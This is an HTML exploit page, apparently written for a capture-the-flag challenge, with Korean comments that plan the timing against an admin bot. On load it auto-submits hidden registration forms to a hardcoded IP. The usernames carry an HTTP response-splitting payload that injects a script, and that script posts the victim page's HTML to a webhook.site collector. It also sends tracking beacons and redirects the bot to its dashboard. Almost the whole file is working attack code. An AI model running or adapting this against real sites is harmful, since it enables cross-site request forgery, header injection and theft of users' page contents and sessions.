<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Loading...</title>
</head>
<body>
    <h1>Processing your request...</h1>
    <p>Please wait...</p>
    
    <iframe name="reg_frame" style="display:none;"></iframe>
    
    <script>
    // === 전략 ===
    // 1. 페이지 즉시 로드 완료 (page.goto() 완료)
    // 2. 봇이 time.sleep(5) 시작
    // 3. 그 동안 CRLF 계정 등록 (가능한 FLAG 이름들)
    // 4. 7초 후: window.location.href로 dashboard navigate
    //    → 봇의 page가 dashboard로 이동!
    //    → 이때 봇은 이미 로그인 완료!
    
    // 완전한 HTTP Response Splitting payload (CSP 우회)
    var crlfPayload = 
        "\r\n" +
        "Content-Length: 0\r\n" +
        "\r\n" +
        "HTTP/1.1 200 OK\r\n" +
        "Content-Type: text/html\r\n" +
        "\r\n" +
        "<html><body>" +
        "<script>" +
        "setTimeout(function(){" +
        "fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316',{" +
        "method:'POST'," +
        "headers:{'Content-Type':'text/plain'}," +
        "body:'FLAG_HTML: '+document.documentElement.innerHTML" +
        "});" +
        "},500);" +
        "</scr"+"ipt>" +
        "</body></html>";
    
    // 가능한 FLAG 형식들
    var possibleFlags = [
        'ASIS{bookmarks}',
        'ASIS{bookmark}',
        'ASIS{crlf}',
        'ASIS{http_response_splitting}',
        'ASIS{response_splitting}',
        'ASIS{header_injection}',
        'ASIS{xss}',
        'ASIS{admin}',
        'ASIS{bot}',
        'ASIS{csrf}',
        'ASIS{session}',
        'ASIS{cookie}',
        'ASIS{flask}',
        'ASIS{playwright}'
    ];
    
    // 즉시 모든 가능한 FLAG로 등록
    possibleFlags.forEach(function(flagName) {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://65.109.202.184/register';
        form.target = 'reg_frame';
        
        var usernameInput = document.createElement('input');
        usernameInput.name = 'username';
        usernameInput.value = flagName + crlfPayload;
        
        var passwordInput = document.createElement('input');
        passwordInput.name = 'password';
        passwordInput.value = 'password';
        
        form.appendChild(usernameInput);
        form.appendChild(passwordInput);
        document.body.appendChild(form);
        form.submit();
    });
    
    // 완료 신호
    setTimeout(function() {
        navigator.sendBeacon('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', 
            'registrations_complete');
    }, 1000);
    
    // === 핵심: 7초 후 dashboard로 navigate ===
    // 봇의 타임라인:
    // 0초: page.goto(우리_URL) 시작
    // ~0.5초: 우리 페이지 로드 완료, page.goto() 완료
    // 0.5초: time.sleep(5) 시작
    // 5.5초: time.sleep(5) 완료
    // 5.5초: page.goto('/register') 시작
    // ~6초: FLAG로 등록 (또는 실패 - 이미 존재)
    // ~7초: page.goto('/login') 시작
    // ~7.5초: FLAG로 로그인 (우리가 만든 계정으로 로그인!)
    // ~8초: time.sleep(1) 완료
    // 8초: "admin stuff" - time.sleep(5) 시작
    
    // 따라서 8초 후에 navigate하면 봇이 로그인된 상태!
    setTimeout(function() {
        navigator.sendBeacon('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', 
            'navigating_to_dashboard_at_8sec');
        
        // 봇의 page를 dashboard로 navigate!
        window.location.href = 'http://65.109.202.184/dashboard';
    }, 8000);
    
    // 추가: 9초, 10초에도 시도 (타이밍 여유)
    setTimeout(function() {
        window.location.href = 'http://65.109.202.184/dashboard';
    }, 9000);
    </script>
</body>
</html>
